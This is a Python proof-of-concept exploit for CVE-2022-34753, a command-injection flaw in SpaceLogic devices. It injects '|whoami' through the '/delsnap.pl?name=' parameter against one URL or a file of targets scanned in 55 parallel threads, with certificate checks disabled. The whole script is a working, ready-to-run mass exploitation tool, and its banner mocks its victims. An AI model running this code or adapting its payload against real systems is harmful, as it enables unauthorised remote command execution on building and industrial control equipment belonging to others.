#!/bin/python3

import re
import requests
from rich.console import Console
import argparse
from concurrent.futures import ThreadPoolExecutor
import urllib3

color = Console()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def send_web_request(url, path):
    try:
        resp = requests.get(url + path, timeout=7, verify=False)
        user = re.findall(
            r'^(root|admin|bin|sys|sync|games|man|lp|mail|news|uucp|www-data|backup|list|irc|gnats|nobody|systemd-timesync|systemd-network|systemd-resolve|systemd-bus-proxy|_apt)$',
            resp.text,)
        if user:
            for users in user:
                color.print(f"[cyan][VULNERABLE][/cyan] [green][INFO][/green] [yellow]{url.ljust(40)}[/yellow][magenta]({users})[/magenta]")
    except requests.exceptions.RequestException:
        pass

def process_file(file):
    with open(file, 'r') as targets:
        urls = [url.strip() for url in targets]
        with ThreadPoolExecutor(max_workers=55) as executor:
            executor.map(send_web_request, urls, ["/delsnap.pl?name=|whoami"] * len(urls))

def ascii_art():
    color.print(
        """[red]
 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗      ██████╗ ██╗  ██╗███████╗███████╗██████╗
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗     ╚════██╗██║  ██║╚════██║██╔════╝╚════██╗
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗█████╔╝███████║    ██╔╝███████╗ █████╔╝
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ██╔═══╝ ╚════╝╚═══██╗╚════██║   ██╔╝ ╚════██║ ╚═══██╗
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗███████╗     ██████╔╝     ██║   ██║  ███████║██████╔╝
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚══════╝     ╚═════╝      ╚═╝   ╚═╝  ╚══════╝╚═════╝
    [/red]
                     --===[      [cyan]Coded with [#FF69B4]<3[/#FF69B4] by K3ysTr0K3R[/cyan]          ]===--
                     --===[        [cyan]Brought to you by NERDS[/cyan] ;)         ]===--
                     --===[ [cyan]Your Security makes me wanna go lolololol[/cyan] ]===--
"""
    )

def main():
    ascii_art()
    parser = argparse.ArgumentParser(description="A PoC for CVE-2022-34753 - SpaceLogic RCE")
    parser.add_argument("-u", "--url", help="Exploit target")
    parser.add_argument("-f", "--file", help="Exploit targets contained in a file")
    args = parser.parse_args()
    if args.url:
        url = args.url
        send_web_request(url, "/delsnap.pl?name=|whoami")
        color.print(f"[yellow](!)[/yellow] [green]Launching exploit against target at[/green] [red]{url}[/red]")
        print("")
    elif args.file:
        file = args.file
        color.print(f"[yellow](!)[/yellow] [green]Launching exploit against target(s) inside[/green] [red]{args.file}[/red]")
        print("")
        process_file(args.file)

if __name__ == "__main__":
    main()
